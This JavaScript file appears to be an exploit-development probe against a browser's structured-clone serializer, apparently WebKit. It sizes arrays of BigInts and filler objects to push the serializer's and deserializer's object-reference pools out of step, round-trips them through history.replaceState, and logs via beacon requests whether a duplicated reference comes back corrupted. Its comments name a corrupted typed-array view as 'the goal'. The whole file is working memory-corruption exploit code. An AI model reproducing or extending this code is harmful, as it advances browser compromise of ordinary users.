// p365 v2 - Structured clone pool mismatch test (lighter version)
//
// Tests the BigInt m_gcBuffer vs m_objectPool size divergence
// Simplified: small arrays, no 64K sparse array
// Beacon prefix: V365-

(function() {
  var BQ = 0;
  function B(tag, body) {
    try {
      var u = '/beacon/V365-' + tag + '?t=' + Date.now() + '&q=' + (BQ++);
      if (body !== undefined && String(body).length < 2000) {
        var x = new XMLHttpRequest();
        x.open('POST', u, true);
        x.send(String(body));
      } else {
        new Image().src = u;
      }
    } catch(e) {
      try { new Image().src = '/beacon/V365-ERR-' + tag.substring(0,30); } catch(e2) {}
    }
  }

  B('BOOT');

  if (typeof BigInt !== 'function') { B('NO-BIGINT'); return; }
  if (typeof history === 'undefined' || typeof history.replaceState !== 'function') {
    B('NO-HISTORY'); return;
  }

  // Pool arithmetic:
  // Serializer m_objectPool gets: outerGraph(1) + fillerGraph(1) + F filler objects + referenceTarget(1) = F+3
  // Deserializer m_gcBuffer gets: outerGraph(1) + fillerGraph(1) + B bigints + F filler objects + referenceTarget(1) = B+F+3
  //
  // Mismatch when F+3 <= 255 AND B+F+3 > 255: serializer writes uint8, deserializer reads uint16
  //
  // USE_BIGINT32=0 in WK-1200: ALL BigInts become heap objects -> always added to m_gcBuffer

  var configs = [
    { b: 1, f: 252, label: 'T1' },
    { b: 4, f: 250, label: 'T4' },
    { b: 8, f: 246, label: 'T8' },
    { b: 0, f: 252, label: 'T0' }  // control: no BigInts, should always match
  ];

  var ti = 0;

  function runNext() {
    if (ti >= configs.length) {
      B('ALL-DONE');
      return;
    }

    var cfg = configs[ti];
    var tag = cfg.label;
    B(tag + '-RUN-b' + cfg.b + '-f' + cfg.f);

    try {
      // Build filler graph: BigInts first, then plain objects
      var filler = [];
      var huge = BigInt(1) << BigInt(40);
      for (var i = 0; i < cfg.b; i++) {
        filler.push(huge + BigInt(i));
      }
      for (var i = 0; i < cfg.f; i++) {
        filler.push({});
      }

      // Duplicate reference target
      var target = { marker: 0x51515151 };

      // Simple outer array: [filler, target, target]
      var outer = [filler, target, target];

      // Serialize
      try {
        history.replaceState(outer, '');
      } catch(e) {
        B(tag + '-STORE-ERR-' + String(e).substring(0, 50));
        ti++;
        setTimeout(runNext, 100);
        return;
      }

      B(tag + '-STORED');

      // Deserialize
      var clone = null;
      try {
        clone = history.state;
      } catch(e) {
        B(tag + '-READ-ERR-' + String(e).substring(0, 50));
        ti++;
        setTimeout(runNext, 100);
        return;
      }

      if (!clone || !Array.isArray(clone)) {
        B(tag + '-BAD-CLONE-' + typeof clone);
        ti++;
        setTimeout(runNext, 100);
        return;
      }

      B(tag + '-CLONELEN-' + clone.length);

      // Core test: do clone[1] === clone[2]?
      var ref1 = clone[1];
      var ref2 = clone[2];

      var same;
      try { same = (ref1 === ref2); } catch(e) { same = 'err'; }
      B(tag + '-SAME-' + same);

      if (same === false) {
        // POOL MISMATCH CONFIRMED
        B(tag + '-MISMATCH');
        try { B(tag + '-R1T-' + typeof ref1); } catch(e) {}
        try { B(tag + '-R2T-' + typeof ref2); } catch(e) {}

        if (ref2 !== null && ref2 !== undefined) {
          try { B(tag + '-R2STR-' + Object.prototype.toString.call(ref2).substring(0, 40)); } catch(e) {}
          try {
            var c = ref2.constructor ? ref2.constructor.name : 'none';
            B(tag + '-R2C-' + c);
          } catch(e) {}

          // If ref2 is a TypedArray, we have a corrupted view (the goal)
          if (ref2 instanceof Uint8Array) {
            B(tag + '-U8A-LEN-' + ref2.length);
            B(tag + '-U8A-BL-' + ref2.buffer.byteLength);
          }
          if (ref2 instanceof Int32Array) {
            B(tag + '-I32-LEN-' + ref2.length);
          }
          if (ref2 instanceof Float64Array) {
            B(tag + '-F64-LEN-' + ref2.length);
          }
          if (Array.isArray(ref2)) {
            B(tag + '-ARR-LEN-' + ref2.length);
            // Dump first 5 elements
            for (var j = 0; j < Math.min(5, ref2.length); j++) {
              try { B(tag + '-ARR' + j + '-' + typeof ref2[j]); } catch(e) {}
            }
          }
        }
      }

      // Also check the filler graph came through OK
      try {
        var f = clone[0];
        if (Array.isArray(f)) {
          B(tag + '-FLEN-' + f.length);
          // Check BigInt elements survived
          if (cfg.b > 0) {
            try { B(tag + '-BI0-' + typeof f[0] + '-' + (typeof f[0] === 'bigint' ? String(f[0]) : '')); } catch(e) {}
          }
        }
      } catch(e) {}

      try { history.replaceState(null, ''); } catch(e) {}

    } catch(e) {
      B(tag + '-ERR-' + String(e).substring(0, 60));
    }

    ti++;
    setTimeout(runNext, 150);
  }

  B('START');
  setTimeout(runNext, 50);
})();
